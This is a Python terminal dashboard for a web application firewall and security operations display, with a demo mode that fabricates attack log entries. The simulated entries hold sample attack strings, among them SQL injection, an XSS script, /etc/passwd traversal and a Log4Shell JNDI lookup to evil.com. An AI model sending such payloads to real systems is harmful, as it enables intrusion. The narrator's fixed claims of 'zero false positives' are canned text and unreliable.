#!/usr/bin/env python3
"""
TokioAI SOC Terminal — Live Autonomous Security Operations CLI
================================================================
Rich-based terminal UI that displays real-time WAF/SOC data from the
TokioAI dashboard API. Designed for large screens (TV displays) at
conferences and security events.

Features:
  - Live attack feed with severity coloring
  - Zero-day radar panel (entropy analysis)
  - DDoS shield status
  - System health metrics
  - AUTONOMOUS MODE: AI narrates security events without human input
  - Drone status panel (when active)
  - Attack statistics and trends

Usage:
  python3 soc_terminal.py --api http://YOUR_SERVER --user admin --pass SECRET
  python3 soc_terminal.py --api http://YOUR_SERVER --user admin --pass SECRET --autonomous
  python3 soc_terminal.py --demo  # Demo mode with simulated data

Requirements: pip install rich requests
"""
import argparse
import json
import os
import random
import sys
import time
import threading
from collections import deque
from datetime import datetime, timezone

try:
    from rich.console import Console
    from rich.layout import Layout
    from rich.live import Live
    from rich.panel import Panel
    from rich.table import Table
    from rich.text import Text
    from rich import box
except ImportError:
    print("ERROR: 'rich' library required. Install: pip install rich")
    sys.exit(1)

try:
    import requests as req_lib
except ImportError:
    print("ERROR: 'requests' library required. Install: pip install requests")
    sys.exit(1)

# ─── Config ───────────────────────────────────────────────────────────────────
API_BASE = os.getenv("TOKIO_DASHBOARD_API", "http://localhost:8000")
API_USER = os.getenv("TOKIO_DASHBOARD_USER", "admin")
API_PASS = os.getenv("TOKIO_DASHBOARD_PASS", "changeme")
REFRESH_INTERVAL = float(os.getenv("TOKIO_CLI_REFRESH", "3.0"))

console = Console()

# ─── Color scheme ─────────────────────────────────────────────────────────────
SEVERITY_COLORS = {
    "critical": "bold red",
    "high": "red",
    "medium": "yellow",
    "low": "cyan",
    "info": "dim white",
}

SEVERITY_ICONS = {
    "critical": "[!!!]",
    "high": "[!! ]",
    "medium": "[ ! ]",
    "low": "[ i ]",
    "info": "[ . ]",
}

THREAT_ICONS = {
    "SQLI": "SQL",
    "XSS": "XSS",
    "CMD_INJECTION": "CMD",
    "PATH_TRAVERSAL": "PTH",
    "LOG4SHELL": "L4S",
    "SCAN_PROBE": "SCN",
    "BRUTE_FORCE": "BRF",
    "SSRF": "SSR",
    "XXE": "XXE",
    "ZERO_DAY_OBFUSCATED": "0DY",
    "RATE_LIMIT": "RLM",
    "HONEYPOT": "HPT",
    "DISTRIBUTED_FLOOD": "DDS",
    "VOLUMETRIC_FLOOD": "VOL",
    "IP_FLOOD": "IPF",
    "SLOWLORIS": "SLW",
    "DESERIALIZATION": "DSR",
    "CRLF_INJECTION": "CRL",
    "HTTP_SMUGGLING": "SMG",
    "NOSQL_INJECTION": "NOS",
    "SSTI": "SST",
    "LDAP_INJECTION": "LDP",
    "API_ABUSE": "API",
    "CRYPTOMINER": "CRY",
}


# ─── API Client ───────────────────────────────────────────────────────────────
class DashboardClient:
    """Client for the TokioAI WAF Dashboard API."""

    def __init__(self, base_url: str, username: str, password: str):
        self.base = base_url.rstrip("/")
        self.token = None
        self.username = username
        self.password = password
        self._login()

    def _login(self):
        try:
            r = req_lib.post(
                f"{self.base}/api/auth/login",
                json={"username": self.username, "password": self.password},
                timeout=10,
            )
            if r.status_code == 200:
                data = r.json()
                self.token = data.get("token") or data.get("access_token")
        except Exception as e:
            self.token = None

    def _headers(self):
        h = {"Content-Type": "application/json"}
        if self.token:
            h["Authorization"] = f"Bearer {self.token}"
        return h

    def _get(self, path: str, params: dict = None):
        try:
            r = req_lib.get(f"{self.base}{path}", headers=self._headers(),
                            params=params, timeout=10)
            if r.status_code == 401:
                self._login()
                r = req_lib.get(f"{self.base}{path}", headers=self._headers(),
                                params=params, timeout=10)
            if r.status_code == 200:
                return r.json()
        except Exception:
            pass
        return {}

    def _get_list(self, path: str, params: dict = None, key: str = "data") -> list:
        data = self._get(path, params)
        if isinstance(data, list):
            return data
        return data.get(key, [])

    def get_stats(self) -> dict:
        raw = self._get("/api/summary")
        if not raw:
            return {}
        # Map API fields to what the UI expects
        total_threats = raw.get("critical", 0) + raw.get("high", 0) + raw.get("medium", 0)
        return {
            "total_requests": raw.get("total", 0),
            "total_threats": total_threats,
            "total_blocks": raw.get("blocked", 0),
            "total_episodes": raw.get("active_episodes", 0),
            "unique_ips": raw.get("unique_ips", 0),
            "blocks_24h": raw.get("active_blocks", 0),
            "threats_24h": total_threats,
            "requests_per_second": 0,
            "current_rps": 0,
            "critical": raw.get("critical", 0),
            "high": raw.get("high", 0),
            "medium": raw.get("medium", 0),
            "low": raw.get("low", 0),
        }

    def get_recent_attacks(self, limit: int = 20) -> list:
        return self._get_list("/api/attacks/recent", {"limit": limit}, "logs")

    def get_episodes(self, limit: int = 10) -> list:
        return self._get_list("/api/episodes", {"limit": limit}, "episodes")

    def get_blocked_ips(self) -> list:
        return self._get_list("/api/blocked", key="blocked_ips")

    def get_signatures(self) -> list:
        return self._get_list("/api/signatures", key="signatures")

    def is_connected(self) -> bool:
        return self.token is not None


# ─── Demo Data Generator ─────────────────────────────────────────────────────
class DemoClient:
    """Generates realistic demo data for offline/demo mode."""

    def __init__(self):
        self._attack_count = 0
        self._block_count = 0
        self._start = time.time()
        self._attacks_log = deque(maxlen=50)
        self._episodes = []
        self._blocked = []
        self._countries = ["CN", "RU", "US", "BR", "IR", "KR", "DE", "IN", "VN", "UA"]
        self._last_gen = 0

    def _maybe_generate(self):
        now = time.time()
        if now - self._last_gen < 2:
            return
        self._last_gen = now

        # Generate 1-3 new attacks
        for _ in range(random.randint(1, 3)):
            self._attack_count += 1
            threat = random.choice([
                "SQLI", "XSS", "CMD_INJECTION", "SCAN_PROBE", "BRUTE_FORCE",
                "PATH_TRAVERSAL", "LOG4SHELL", "ZERO_DAY_OBFUSCATED", "SSRF",
                "HONEYPOT", "DESERIALIZATION", "CRLF_INJECTION",
            ])
            sev = random.choice(["critical", "high", "medium"])
            ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

            attack = {
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "ip": ip,
                "method": random.choice(["GET", "POST", "PUT"]),
                "uri": random.choice([
                    "/' OR 1=1--",
                    "/wp-login.php",
                    "/<script>alert(1)</script>",
                    "/etc/passwd",
                    "/${jndi:ldap://evil.com}",
                    "/api?q=%24%7Blower%3Aj%7D",
                    "/admin/.env",
                    "/shell.php",
                    "/api/users?page=99999",
                ]),
                "status": random.choice([403, 200, 301, 404]),
                "severity": sev,
                "threat_type": threat,
                "sig_id": f"WAF-{random.randint(1001,5001)}",
                "confidence": round(random.uniform(0.75, 0.99), 2),
                "action": "block_ip" if sev in ("critical", "high") else "monitor",
                "country": random.choice(self._countries),
            }

            # Add zero-day specific fields
            if threat == "ZERO_DAY_OBFUSCATED":
                attack["entropy"] = round(random.uniform(4.5, 6.2), 2)
                attack["encoding_layers"] = random.randint(2, 5)

            self._attacks_log.append(attack)

            # Sometimes block
            if sev == "critical" and random.random() > 0.3:
                self._block_count += 1
                self._blocked.append({
                    "ip": ip, "reason": f"Auto-block: {threat}",
                    "threat_type": threat, "severity": sev,
                    "blocked_at": datetime.now(timezone.utc).isoformat(),
                    "block_type": "instant",
                })
                if len(self._blocked) > 30:
                    self._blocked.pop(0)

    def is_connected(self) -> bool:
        return True

    def get_stats(self) -> dict:
        self._maybe_generate()
        elapsed = time.time() - self._start
        return {
            "total_requests": self._attack_count * 15 + random.randint(100, 500),
            "total_threats": self._attack_count,
            "total_blocks": self._block_count,
            "total_episodes": len(self._episodes),
            "requests_per_second": round(random.uniform(5, 45), 1),
            "threats_24h": self._attack_count,
            "blocks_24h": self._block_count,
            "top_threats": {
                "SQLI": random.randint(10, 50),
                "XSS": random.randint(5, 30),
                "SCAN_PROBE": random.randint(20, 80),
                "ZERO_DAY_OBFUSCATED": random.randint(1, 10),
                "BRUTE_FORCE": random.randint(5, 25),
            },
            "severity_breakdown": {
                "critical": random.randint(5, 20),
                "high": random.randint(10, 40),
                "medium": random.randint(20, 60),
                "low": random.randint(30, 100),
            },
        }

    def get_recent_attacks(self, limit: int = 20) -> list:
        self._maybe_generate()
        return list(self._attacks_log)[-limit:]

    def get_episodes(self, limit: int = 10) -> list:
        return []

    def get_blocked_ips(self) -> list:
        return self._blocked[-15:]

    def get_signatures(self) -> list:
        return []


# ─── Autonomous AI Narrator ──────────────────────────────────────────────────
class AutonomousNarrator:
    """
    AI-like narrator that analyzes patterns and generates insights.
    No LLM needed — uses rule-based analysis with personality.
    """

    def __init__(self):
        self.narrations: deque = deque(maxlen=30)
        self._last_stats = {}
        self._seen_ips = set()
        self._seen_threats = set()
        self._narration_count = 0
        self._attack_trend = deque(maxlen=10)  # recent attack counts

    def analyze(self, stats: dict, attacks: list, blocked: list) -> None:
        """Analyze current state and generate narrations."""
        now = datetime.now().strftime("%H:%M:%S")

        # Track attack trend
        threat_count = stats.get("total_threats", 0)
        self._attack_trend.append(threat_count)

        # ─── Analyze new attacks ──────────────────────────────────────────
        for atk in attacks[-5:]:  # Only recent ones
            ip = atk.get("ip", "")
            threat = atk.get("threat_type", "")
            sev = atk.get("severity", "")

            # New IP detected
            if ip and ip not in self._seen_ips:
                self._seen_ips.add(ip)
                country = atk.get("country", "??")
                if sev == "critical":
                    self._add(now, "critical",
                              f"Nueva IP atacante: {ip} ({country}) — {threat} "
                              f"con confianza {float(atk.get('confidence', 0) or 0):.0%}. "
                              f"Bloqueada automaticamente.")

            # Zero-day detected
            if threat == "ZERO_DAY_OBFUSCATED":
                entropy = atk.get("entropy", 0)
                layers = atk.get("encoding_layers", 0)
                self._add(now, "critical",
                          f"ZERO-DAY detectado — Payload con entropia {entropy:.2f}, "
                          f"{layers} capas de encoding. Este ataque evadira WAFs "
                          f"tradicionales basados en regex. Bloqueado por analisis "
                          f"de entropia.")

        # ─── Trend analysis ───────────────────────────────────────────────
        if len(self._attack_trend) >= 5:
            recent = list(self._attack_trend)
            if len(recent) >= 3:
                trend_diff = recent[-1] - recent[-3]
                if trend_diff > 10:
                    self._add(now, "high",
                              f"Tendencia al alza: +{trend_diff} amenazas en los "
                              f"ultimos ciclos. Posible ataque coordinado en progreso. "
                              f"Monitoreando patrones de distribucion.")
                elif trend_diff < -5 and self._narration_count > 5:
                    self._add(now, "info",
                              f"Trafico normalizandose. Amenazas bajaron {abs(trend_diff)} "
                              f"en los ultimos ciclos. Defensas activas, sistemas estables.")

        # ─── Periodic status narration ────────────────────────────────────
        self._narration_count += 1
        if self._narration_count % 10 == 0:  # Every ~30 seconds
            rps = stats.get("requests_per_second", stats.get("current_rps", 0))
            blocks = stats.get("total_blocks", stats.get("blocks_24h", 0))
            threats = stats.get("total_threats", stats.get("threats_24h", 0))
            blocked_count = len(blocked)

            self._add(now, "info",
                      f"Status operacional: {rps:.0f} req/s, "
                      f"{threats} amenazas detectadas, {blocks} bloqueadas, "
                      f"{blocked_count} IPs en blocklist activa. "
                      f"Todos los sistemas operativos.")

        # ─── Pattern detection ────────────────────────────────────────────
        if self._narration_count % 15 == 0 and attacks:
            # Analyze attack distribution
            threat_types = {}
            for atk in attacks:
                t = atk.get("threat_type", "UNKNOWN")
                threat_types[t] = threat_types.get(t, 0) + 1

            if threat_types:
                top_threat = max(threat_types, key=threat_types.get)
                count = threat_types[top_threat]
                total = sum(threat_types.values())
                pct = count / total * 100 if total > 0 else 0

                if pct > 50:
                    self._add(now, "high",
                              f"Patron concentrado: {top_threat} representa el "
                              f"{pct:.0f}% de los ataques recientes ({count}/{total}). "
                              f"Posible campaña dirigida. Firmas actualizadas, "
                              f"deteccion operativa.")

        # ─── Blocked IPs analysis ─────────────────────────────────────────
        if self._narration_count % 20 == 0 and blocked:
            instant_blocks = sum(1 for b in blocked
                                  if b.get("block_type") == "instant")
            if instant_blocks > 0:
                self._add(now, "info",
                          f"Bloqueos instantaneos: {instant_blocks} IPs bloqueadas "
                          f"en primer contacto por firmas criticas. "
                          f"Tiempo de reaccion: <1ms. Zero false positives.")

    def _add(self, timestamp: str, severity: str, text: str) -> None:
        self.narrations.append({
            "time": timestamp,
            "severity": severity,
            "text": text,
        })

    def get_narrations(self, limit: int = 15) -> list:
        return list(self.narrations)[-limit:]


# ─── UI Layout Builder ────────────────────────────────────────────────────────

def build_header(connected: bool, autonomous: bool) -> Panel:
    """Build the header panel."""
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    mode = "AUTONOMOUS" if autonomous else "MONITORING"
    conn = "[green]CONNECTED[/]" if connected else "[red]DISCONNECTED[/]"
    status_line = f" {conn}  |  Mode: [cyan]{mode}[/]  |  {now}"

    header_text = Text()
    header_text.append("  TOKIOAI", style="bold cyan")
    header_text.append(" SOC TERMINAL", style="bold white")
    header_text.append(f"  v1.0{status_line}", style="dim white")

    return Panel(header_text, style="cyan", box=box.DOUBLE)


def build_attacks_panel(attacks: list) -> Panel:
    """Build the live attacks panel."""
    table = Table(box=box.SIMPLE_HEAD, show_header=True, expand=True,
                  header_style="bold cyan", pad_edge=False)
    table.add_column("Time", width=8, style="dim")
    table.add_column("Sev", width=5)
    table.add_column("Type", width=4)
    table.add_column("IP", width=15)
    table.add_column("URI", ratio=1)
    table.add_column("Conf", width=5, justify="right")
    table.add_column("Act", width=5)

    for atk in reversed(attacks[-15:]):
        ts = atk.get("timestamp", "")
        if isinstance(ts, str) and "T" in ts:
            ts = ts.split("T")[1][:8]
        elif isinstance(ts, str) and " " in ts:
            ts = ts.split(" ")[1][:8]

        sev = atk.get("severity", "info")
        color = SEVERITY_COLORS.get(sev, "white")
        icon = SEVERITY_ICONS.get(sev, "[ ]")
        threat = THREAT_ICONS.get(atk.get("threat_type", ""), "???")
        conf = atk.get("confidence")
        try:
            conf_str = f"{float(conf):.0%}" if conf else "--"
        except (ValueError, TypeError):
            conf_str = "--"
        action = atk.get("action", "log")
        act_str = "BLK" if action == "block_ip" else "MON"
        act_color = "red" if action == "block_ip" else "yellow"

        uri = atk.get("uri", "")
        if len(uri) > 45:
            uri = uri[:42] + "..."

        table.add_row(
            ts,
            Text(icon, style=color),
            Text(threat, style=color),
            atk.get("ip", "?"),
            uri,
            Text(conf_str, style=color),
            Text(act_str, style=act_color),
        )

    return Panel(table, title="[bold red] LIVE ATTACKS [/]",
                 border_style="red", box=box.ROUNDED)


def build_zeroday_panel(attacks: list) -> Panel:
    """Build zero-day radar panel."""
    zd_attacks = [a for a in attacks if a.get("threat_type") == "ZERO_DAY_OBFUSCATED"]

    lines = []
    if not zd_attacks:
        lines.append(Text("  No zero-day payloads detected", style="green"))
        lines.append(Text("  Entropy analysis: ACTIVE", style="dim"))
        lines.append(Text("  Scanning all payloads in real-time", style="dim"))

        # Animated radar effect
        t = int(time.time()) % 4
        radar = ["  [=       ]", "  [  =     ]", "  [    =   ]", "  [      = ]"]
        lines.append(Text(f"  Radar: {radar[t]}", style="cyan"))
    else:
        for zd in zd_attacks[-5:]:
            ent = zd.get("entropy", 0)
            layers = zd.get("encoding_layers", 0)
            conf = zd.get("confidence", 0)

            # Entropy bar
            ent_pct = min(1.0, ent / 6.0)
            bar_len = int(ent_pct * 15)
            bar = "#" * bar_len + "." * (15 - bar_len)
            bar_color = "red" if ent > 5.0 else "yellow"

            lines.append(Text(f"  IP: {zd.get('ip', '?')}", style="red"))
            lines.append(Text(f"  Entropy: [{bar}] {ent:.2f}", style=bar_color))
            lines.append(Text(f"  Layers: {layers} | Conf: {conf:.0%}", style="yellow"))
            lines.append(Text(f"  Action: BLOCKED", style="bold red"))
            lines.append(Text("  ---", style="dim"))

    content = Text("\n")
    for line in lines:
        content.append_text(line)
        content.append("\n")

    return Panel(content, title="[bold magenta] ZERO-DAY RADAR [/]",
                 border_style="magenta", box=box.ROUNDED)


def build_ddos_panel(stats: dict) -> Panel:
    """Build DDoS shield status panel."""
    rps = stats.get("requests_per_second", stats.get("current_rps", 0))
    if isinstance(rps, str):
        try:
            rps = float(rps)
        except ValueError:
            rps = 0

    # RPS bar
    max_rps = 100
    rps_pct = min(1.0, rps / max_rps)
    bar_len = int(rps_pct * 20)
    bar = "|" * bar_len + "." * (20 - bar_len)

    if rps_pct > 0.8:
        bar_color = "bold red"
        shield_status = "[red]UNDER ATTACK[/]"
    elif rps_pct > 0.5:
        bar_color = "yellow"
        shield_status = "[yellow]ELEVATED[/]"
    else:
        bar_color = "green"
        shield_status = "[green]NORMAL[/]"

    blocked_ips = stats.get("blocks_24h", 0)
    lines = [
        Text(f"  Status: ", style="white"),
        Text(f"  RPS: [{bar}] {rps:.0f}", style=bar_color),
        Text(f"  Mitigation: iptables + GCP Firewall + nginx", style="cyan"),
        Text(f"  Rate Limit: ACTIVE", style="green"),
        Text(f"  Blocked IPs: {blocked_ips}", style="white"),
        Text(f"  Total Blocks: {stats.get('total_blocks', 0)}", style="white"),
    ]

    content = Text("\n")
    content.append(f"  Shield: {shield_status}\n")
    for line in lines:
        content.append_text(line)
        content.append("\n")

    return Panel(content, title="[bold blue] DDOS SHIELD [/]",
                 border_style="blue", box=box.ROUNDED)


def build_stats_panel(stats: dict) -> Panel:
    """Build system stats panel."""
    total = stats.get("total_requests", 0)
    threats = stats.get("total_threats", stats.get("threats_24h", 0))
    blocks = stats.get("total_blocks", stats.get("blocks_24h", 0))
    episodes = stats.get("total_episodes", 0)

    # Top threats
    top_threats = stats.get("top_threats", {})

    lines = [
        f"  Requests:  {total:,}",
        f"  Threats:   {threats:,}",
        f"  Blocked:   {blocks:,}",
        f"  Episodes:  {episodes:,}",
        f"  ---",
    ]

    if top_threats:
        lines.append("  Top Threats:")
        sorted_threats = sorted(top_threats.items(), key=lambda x: x[1], reverse=True)
        for t_name, t_count in sorted_threats[:5]:
            short = THREAT_ICONS.get(t_name, t_name[:3])
            lines.append(f"    {short}: {t_count}")

    content = "\n".join(lines)
    return Panel(content, title="[bold green] STATISTICS [/]",
                 border_style="green", box=box.ROUNDED)


def build_blocked_panel(blocked: list) -> Panel:
    """Build blocked IPs panel."""
    table = Table(box=None, show_header=True, expand=True,
                  header_style="bold red", pad_edge=False)
    table.add_column("IP", width=15)
    table.add_column("Reason", ratio=1)
    table.add_column("Type", width=8)

    for b in blocked[-10:]:
        reason = b.get("reason", "")
        if len(reason) > 35:
            reason = reason[:32] + "..."
        table.add_row(
            b.get("ip", "?"),
            reason,
            b.get("block_type", "auto"),
        )

    return Panel(table, title="[bold red] BLOCKED IPs [/]",
                 border_style="red", box=box.ROUNDED)


def build_narrator_panel(narrations: list) -> Panel:
    """Build the AI narrator panel."""
    content = Text()

    if not narrations:
        content.append("  Tokio AI initializing...\n", style="dim cyan")
        content.append("  Analyzing traffic patterns...\n", style="dim")
        content.append("  Building baseline...\n", style="dim")
    else:
        for n in narrations[-8:]:
            sev = n.get("severity", "info")
            color = SEVERITY_COLORS.get(sev, "white")
            timestamp = n.get("time", "")
            text = n.get("text", "")

            content.append(f"  [{timestamp}] ", style="dim")
            content.append(f"{text}\n\n", style=color)

    return Panel(content, title="[bold cyan] TOKIO AI — AUTONOMOUS ANALYSIS [/]",
                 border_style="cyan", box=box.DOUBLE)


def build_layout(client, narrator: AutonomousNarrator,
                 autonomous: bool) -> Layout:
    """Build the full terminal layout."""
    # Fetch data
    stats = client.get_stats()
    attacks = client.get_recent_attacks(20)
    blocked = client.get_blocked_ips()

    # Run autonomous analysis
    if autonomous:
        narrator.analyze(stats, attacks, blocked)

    # Build layout
    layout = Layout()
    layout.split_column(
        Layout(name="header", size=3),
        Layout(name="body"),
        Layout(name="narrator", size=14) if autonomous else Layout(name="spacer", size=1),
    )

    # Body: left (attacks) + right (panels)
    layout["body"].split_row(
        Layout(name="left", ratio=3),
        Layout(name="right", ratio=2),
    )

    # Right: stacked panels
    layout["right"].split_column(
        Layout(name="zeroday"),
        Layout(name="ddos"),
        Layout(name="stats"),
        Layout(name="blocked"),
    )

    # Populate
    layout["header"].update(build_header(client.is_connected(), autonomous))
    layout["left"].update(build_attacks_panel(attacks))
    layout["zeroday"].update(build_zeroday_panel(attacks))
    layout["ddos"].update(build_ddos_panel(stats))
    layout["stats"].update(build_stats_panel(stats))
    layout["blocked"].update(build_blocked_panel(blocked))

    if autonomous:
        layout["narrator"].update(
            build_narrator_panel(narrator.get_narrations()))

    return layout


# ─── Main ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="TokioAI SOC Terminal — Live Security Operations CLI")
    parser.add_argument("--api", default=API_BASE,
                        help="Dashboard API URL")
    parser.add_argument("--user", default=API_USER,
                        help="Dashboard username")
    parser.add_argument("--password", "--pass", default=API_PASS, dest="password",
                        help="Dashboard password")
    parser.add_argument("--autonomous", "-a", action="store_true",
                        help="Enable autonomous AI narration mode")
    parser.add_argument("--demo", action="store_true",
                        help="Demo mode with simulated data")
    parser.add_argument("--refresh", type=float, default=REFRESH_INTERVAL,
                        help="Refresh interval in seconds")
    args = parser.parse_args()

    console.clear()
    console.print("[bold cyan]TokioAI SOC Terminal[/] starting...", style="cyan")

    if args.demo:
        console.print("[yellow]DEMO MODE[/] — using simulated data", style="yellow")
        client = DemoClient()
    else:
        console.print(f"Connecting to {args.api}...", style="dim")
        client = DashboardClient(args.api, args.user, args.password)
        if client.is_connected():
            console.print("[green]Connected to dashboard API[/]")
        else:
            console.print("[red]WARNING: Could not authenticate. "
                          "Retrying on each refresh...[/]")

    narrator = AutonomousNarrator()

    if args.autonomous:
        console.print("[cyan]AUTONOMOUS MODE[/] — Tokio will narrate events")

    console.print(f"Refresh: {args.refresh}s | Press Ctrl+C to exit\n")
    time.sleep(1)

    try:
        with Live(console=console, refresh_per_second=1,
                  screen=True) as live:
            while True:
                layout = build_layout(client, narrator, args.autonomous)
                live.update(layout)
                time.sleep(args.refresh)
    except KeyboardInterrupt:
        console.print("\n[cyan]TokioAI SOC Terminal[/] — shutdown.", style="dim")


if __name__ == "__main__":
    main()
